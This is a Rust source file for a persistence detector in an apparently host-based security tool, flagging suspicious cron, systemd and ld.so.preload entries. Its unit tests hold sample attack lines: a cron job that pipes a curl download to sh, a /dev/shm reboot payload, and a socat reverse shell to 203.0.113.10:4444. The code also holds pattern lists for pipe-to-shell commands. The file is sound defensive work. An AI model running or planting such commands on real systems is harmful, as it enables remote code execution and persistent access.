use crate::detectors::command_profile::assess_network_execution_command;
use crate::detectors::{evidence, string_field, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Finding, RawEvent, Severity};
use std::collections::BTreeSet;

pub struct PersistenceDetector;

impl Detector for PersistenceDetector {
    fn name(&self) -> &'static str {
        "persistence_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "PERSIST-001",
                "New or changed persistence entry",
                Category::Persistence,
                Severity::High,
                "A startup-related file changed relative to the baseline.",
            ),
            RuleMetadata::new(
                "PERSIST-002",
                "Suspicious cron or startup command",
                Category::Persistence,
                Severity::High,
                "A persistence command reached the suspicious risk score threshold.",
            ),
            RuleMetadata::new(
                "PERSIST-003",
                "ld.so.preload modified",
                Category::Persistence,
                Severity::High,
                "Dynamic linker preload configuration changed or contains entries.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        for event in events {
            match event.kind.as_str() {
                "persistence_created" | "persistence_modified" => {
                    if event.field("type") == Some("ld_preload") {
                        findings.push(ld_preload_changed(event, ctx));
                    } else {
                        findings.push(persistence_changed(event, ctx));
                    }
                }
                "persistence_entry" => {
                    let assessment = assess_persistence_entry(event);
                    if assessment.is_suspicious(ctx.config.persistence.suspicious_command_min_score)
                    {
                        findings.push(suspicious_entry(event, ctx, assessment));
                    }
                }
                _ => {}
            }
        }
        findings
    }
}

fn persistence_changed(event: &RawEvent, ctx: &DetectContext) -> Finding {
    let path = string_field(event, "path");
    Finding::new(
        &ctx.host_id,
        "Persistence-related file changed",
        "A cron, systemd, or shell startup file changed compared with the baseline.",
        Severity::High,
        Category::Persistence,
        "PERSIST-001",
        &path,
    )
    .with_evidence(diff_evidence(event))
    .with_recommendations(vec![
        "Inspect the startup entry and verify it was added by an administrator or package update."
            .to_string(),
        "Check whether the referenced executable lives in temporary or web-writable paths."
            .to_string(),
    ])
}

fn suspicious_entry(
    event: &RawEvent,
    ctx: &DetectContext,
    assessment: PersistenceEntryAssessment,
) -> Finding {
    let path = string_field(event, "path");
    Finding::new(
        &ctx.host_id,
        "Suspicious startup command detected",
        "A startup-related file contains a command whose risk score reached the suspicious threshold.",
        Severity::High,
        Category::Persistence,
        "PERSIST-002",
        &path,
    )
    .with_evidence(vec![
        evidence("path", path),
        evidence("type", string_field(event, "type")),
        evidence("suspicious_lines", string_field(event, "suspicious_lines")),
        evidence("risk_score", assessment.score.to_string()),
        evidence("risk_reasons", assessment.reason_text()),
        evidence("risk_features", assessment.feature_names()),
    ])
    .with_impact(vec![
        "The host may run attacker-controlled code automatically after reboot or login."
            .to_string(),
    ])
    .with_recommendations(vec![
        "Review the command target and network destination.".to_string(),
        "Preserve the file before removing unknown startup entries.".to_string(),
    ])
}

#[derive(Debug, Clone, Default)]
struct PersistenceEntryAssessment {
    score: u16,
    reasons: BTreeSet<String>,
    features: BTreeSet<&'static str>,
}

impl PersistenceEntryAssessment {
    fn is_suspicious(&self, min_score: u16) -> bool {
        self.score >= min_score
    }

    fn absorb(&mut self, line: &str) {
        let line_assessment = assess_persistence_line(line);
        self.score = self.score.max(line_assessment.score);
        self.reasons.extend(line_assessment.reasons);
        self.features.extend(line_assessment.features);
    }

    fn reason_text(&self) -> String {
        self.reasons.iter().cloned().collect::<Vec<_>>().join("; ")
    }

    fn feature_names(&self) -> String {
        self.features.iter().copied().collect::<Vec<_>>().join(", ")
    }
}

fn assess_persistence_entry(event: &RawEvent) -> PersistenceEntryAssessment {
    let mut assessment = PersistenceEntryAssessment::default();
    for line in string_field(event, "suspicious_lines").lines() {
        assessment.absorb(line);
    }
    assessment
}

fn assess_persistence_line(line: &str) -> PersistenceEntryAssessment {
    let lowered = line.to_ascii_lowercase();
    let mut assessment = PersistenceEntryAssessment::default();

    let network_assessment = assess_network_execution_command(line);
    if network_assessment.is_suspicious() {
        assessment.score = assessment.score.max(90);
        assessment.reasons.insert(network_assessment.reason_text());
        assessment.features.insert("network_execution_bridge");
    }

    if contains_temp_payload_path(&lowered) {
        assessment.score = assessment.score.max(80);
        assessment
            .reasons
            .insert("startup command references a temporary executable path".to_string());
        assessment.features.insert("temporary_path");
    }

    let downloader = contains_command_word(&lowered, &["curl", "wget"]);
    let pipe_to_shell = contains_pipe_to_shell(&lowered);
    if downloader && pipe_to_shell {
        assessment.score = assessment.score.max(85);
        assessment
            .reasons
            .insert("startup command downloads data and pipes it to a shell".to_string());
        assessment.features.insert("download_to_shell");
    }

    if contains_base64_decode(&lowered) && (pipe_to_shell || lowered.contains("eval")) {
        assessment.score = assessment.score.max(80);
        assessment
            .reasons
            .insert("startup command decodes payload data before shell execution".to_string());
        assessment.features.insert("encoded_shell_payload");
    }

    if is_shell_wrapper_only(&lowered) {
        assessment.features.insert("shell_wrapper");
    }

    assessment
}

fn contains_temp_payload_path(line: &str) -> bool {
    ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|marker| line.contains(marker))
}

fn contains_command_word(line: &str, commands: &[&str]) -> bool {
    line.split(|ch: char| !(ch.is_ascii_alphanumeric() || matches!(ch, '_' | '-' | '/' | '.')))
        .filter_map(|token| token.rsplit('/').next())
        .any(|name| commands.contains(&name))
}

fn contains_pipe_to_shell(line: &str) -> bool {
    ["| sh", "|sh", "| bash", "|bash", "| /bin/sh", "| /bin/bash"]
        .iter()
        .any(|marker| line.contains(marker))
}

fn contains_base64_decode(line: &str) -> bool {
    line.contains("base64") && (line.contains(" -d") || line.contains("--decode"))
}

fn is_shell_wrapper_only(line: &str) -> bool {
    (line.contains("bash -c") || line.contains("sh -c"))
        && !contains_temp_payload_path(line)
        && !contains_pipe_to_shell(line)
        && !contains_base64_decode(line)
}

fn ld_preload_changed(event: &RawEvent, ctx: &DetectContext) -> Finding {
    let path = string_field(event, "path");
    Finding::new(
        &ctx.host_id,
        "ld.so.preload changed",
        "Dynamic linker preload configuration changed relative to the baseline.",
        Severity::High,
        Category::Persistence,
        "PERSIST-003",
        &path,
    )
    .with_evidence(diff_evidence(event))
    .with_recommendations(vec![
        "Inspect preload entries and verify every referenced library.".to_string(),
        "Treat unknown entries as a possible rootkit signal, not a confirmed rootkit by itself."
            .to_string(),
    ])
}

fn diff_evidence(event: &RawEvent) -> Vec<sentinel_core::Evidence> {
    vec![
        evidence("change", event.kind.clone()),
        evidence("type", string_field(event, "type")),
        evidence("path", string_field(event, "path")),
        evidence("previous_hash", string_field(event, "previous_hash")),
        evidence("current_hash", string_field(event, "current_hash")),
    ]
}

#[cfg(test)]
mod tests {
    use super::assess_persistence_line;

    #[test]
    fn persistence_risk_model_ignores_plain_shell_wrappers() {
        let assessment =
            assess_persistence_line("ExecStart=/bin/bash -c 'read args <&3; echo args=$args'");
        assert!(!assessment.is_suspicious(70));
        assert!(assessment.features.contains("shell_wrapper"));
    }

    #[test]
    fn persistence_risk_model_detects_download_to_shell() {
        let assessment = assess_persistence_line("* * * * * curl http://203.0.113.10/x | sh");
        assert!(assessment.is_suspicious(70));
        assert!(assessment.features.contains("download_to_shell"));
    }

    #[test]
    fn persistence_risk_model_detects_temp_autostart_payload() {
        let assessment = assess_persistence_line("@reboot /dev/shm/.x");
        assert!(assessment.is_suspicious(70));
        assert!(assessment.features.contains("temporary_path"));
    }

    #[test]
    fn persistence_risk_model_uses_network_execution_profile() {
        let assessment =
            assess_persistence_line("ExecStart=socat TCP:203.0.113.10:4444 EXEC:/bin/sh,pty");
        assert!(assessment.is_suspicious(70));
        assert!(assessment.features.contains("network_execution_bridge"));
    }
}
